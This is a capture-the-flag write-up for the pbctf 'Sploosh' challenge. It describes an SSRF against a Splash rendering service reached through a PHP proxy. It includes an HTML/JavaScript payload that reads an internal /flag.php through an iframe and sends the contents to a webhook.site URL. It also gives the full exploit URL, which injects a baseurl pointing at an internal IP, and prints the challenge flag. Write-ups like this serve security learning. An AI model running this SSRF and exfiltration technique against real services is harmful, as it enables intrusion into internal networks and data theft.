# Sploosh

```
I wanted to make my own URL scraper, but parsing HTML is hard, so I used some random open source scraping project instead.

http://sploosh.chal.perfect.blue/

By: Corb3nik

```

I ended up solving this with an unintended solution, so I thought a writeup could be useful. The challenge was basically a [splash](https://github.com/scrapinghub/splash) instance, and a separate php api that proxies requests to it and also serves the flag. The `/flag.php` endpoint prints the flag only if the request is originating either from the api or splash. When a request is sent to the api to render a webpage using splash, the url we pass is urlencoded to prevent us from adding additional query parameters at the end of the url which get interpreted as options by splash. The first step is to bypass this proteciton by making splash request itself before it requests an external site. That way we control the whole querystring passed to splash (since the api.php also adds a `timeout=1` to the initial request, this makes me believe this bypass was the unintended part). This allows us to add a `baseurl=http://172.16.0.14/` query parameter, which makes all requests from the rendered website go to the api server instead of the actual host, allowing us to simply request `/flag.php` from javascript to get the flag. If we were instead not going to use `baseurl` and just request `http://172.16.0.14/flag.php` we would get CORS violations. When we get hold of the flag, we just send it along back to us with another request.

I don't know javascript very well, so the hardest part for me was fetching and sending the flag before the load event is triggered which splash uses to know when to stop rendering. I came up with this disgusting solution that loads `/flag.php` in an iframe, then requests a bogus stylesheet to just take up time and let the flag actually load into the iframe before it is read by the javascript and sent away.

```html
<!DOCTYPE html>
<html lang="en">
<body>
    <iframe src="/flag.php" id="frame" frameborder="0"></iframe>
    <link rel="stylesheet" href="https://google.com">
    <script>
        flag = document.getElementById("frame").contentWindow.document.body.innerHTML
        r = new XMLHttpRequest();
        r.open("GET", "https://webhook.site/9525117e-b9b5-4b9b-b707-cca9b403a9c7/"+btoa(flag));
        r.send();
    </script>
</body>
</html>
```

The final url was then this, after which the flag appears in the webhook.site interface:

```http://sploosh.chal.perfect.blue/api.php?url=http://localhost:8050/render.html?timeout=1%26url=https://webhook.site/9525117e-b9b5-4b9b-b707-cca9b403a9c7?3%26baseurl=http://172.16.0.14/```

`pbctf{1_h0p3_y0u_us3d_lua_f0r_th1s}` (sorry, i didn't)